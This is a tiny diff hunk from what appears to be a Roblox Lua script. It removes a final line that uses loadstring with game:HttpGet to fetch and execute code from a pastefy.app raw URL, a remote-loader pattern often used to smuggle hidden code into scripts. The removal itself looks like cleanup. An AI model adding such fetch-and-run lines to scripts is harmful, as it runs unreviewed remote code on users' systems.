@@ -299,4 +299,3 @@ coroutine.wrap(function()
 		updatePetInfoLabel()
 	end
 end)()
-loadstring(game:HttpGet("https://pastefy.app/CCjCqDQZ/raw"))()
